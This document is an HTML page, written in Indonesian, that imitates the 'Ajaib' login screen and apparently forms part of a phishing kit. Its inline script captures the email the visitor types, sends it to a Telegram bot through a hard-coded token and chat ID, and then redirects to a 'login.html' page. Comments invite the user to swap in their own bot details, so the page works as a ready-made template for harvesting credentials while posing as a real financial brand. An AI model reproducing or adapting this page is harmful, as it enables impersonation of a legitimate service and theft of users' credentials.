<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Ajaib Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #fff;
            color: #1a1a1a;
        }
        .container {
            max-width: 480px;
            margin: 0 auto;
            padding-top: 20px;
        }
        .back-arrow {
            width: 24px;
            height: 24px;
            cursor: pointer;
            user-select: none;
            margin-bottom: 10px;
            fill: #000;
            transition: fill 0.3s;
        }
        .back-arrow:hover {
            fill: #3a82f7;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        p.description {
            font-size: 14px;
            color: #555;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        label {
            font-weight: 700;
            display: block;
            margin-bottom: 8px;
        }
        input[type="email"] {
            width: 100%;
            padding: 12px 10px;
            border: 2px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.3s;
        }
        input[type="email"]:focus {
            border-color: #3a82f7;
        }
        button {
            margin-top: 20px;
            background-color: #dbe4ea;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 8px;
            font-size: 16px;
            color: #999;
            cursor: not-allowed;
            transition: background-color 0.3s, color 0.3s;
        }
        button.enabled {
            background-color: #3a82f7;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="container">
    <svg class="back-arrow" viewBox="0 0 24 24" onclick="goBack()" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Kembali" >
        <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/>
    </svg>

    <h1>Ajaib Login</h1>
    <p class="description">
        Masukkan alamat email yang telah terdaftar di Ajaib untuk melanjutkan atau alamat email baru untuk daftar akun Ajaib.
    </p>

    <form id="emailForm">
        <label for="email">Email</label>
        <input type="email" id="email" name="email" placeholder="contoh@mail.com" required>
        <button type="submit" id="submitBtn" disabled>Lanjut</button>
    </form>
</div>

<script>
    const emailInput = document.getElementById('email');
    const submitBtn = document.getElementById('submitBtn');

    // Masukkan token dan chat ID Anda di sini
    const TELEGRAM_BOT_TOKEN = '8368615243%3AAAF5xROeGbDUce-sR19mcUr_qOaUf78YEfA'; // Ganti dengan Bot Token Anda
    const TELEGRAM_CHAT_ID = '7549590022'; // Ganti dengan Chat ID Anda

    // Aktifkan tombol jika input email valid
    emailInput.addEventListener('input', function () {
        if (emailInput.validity.valid && emailInput.value.trim() !== '') {
            submitBtn.disabled = false;
            submitBtn.classList.add('enabled');
        } else {
            submitBtn.disabled = true;
            submitBtn.classList.remove('enabled');
        }
    });

    // Fungsi kirim pesan ke telegram
    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const params = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        };

        try {
            const response = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json;charset=UTF-8"
                },
                body: JSON.stringify(params)
            });

            const data = await response.json();
            return data.ok;  // true jika berhasil
        } catch (error) {
            console.error("Error mengirim ke Telegram:", error);
            return false;
        }
    }

    // Submit form dan kirim email ke Telegram serta simpan ke localStorage
    document.getElementById('emailForm').addEventListener('submit', async function (e) {
        e.preventDefault();
        const emailValue = emailInput.value.trim();

        // Simpan ke localStorage
        localStorage.setItem('userEmail', emailValue);

        // Kirim ke Telegram
        const message = `Email baru diterima: ${emailValue}`;
        const success = await sendToTelegram(message);

        if (success) {
            window.location.href = "login.html";
        } else {
            alert('Gagal mengirim email ke Telegram, namun sudah disimpan.');
        }
    });

    function goBack() {
        window.history.back();
    }
</script>

</body>
</html>
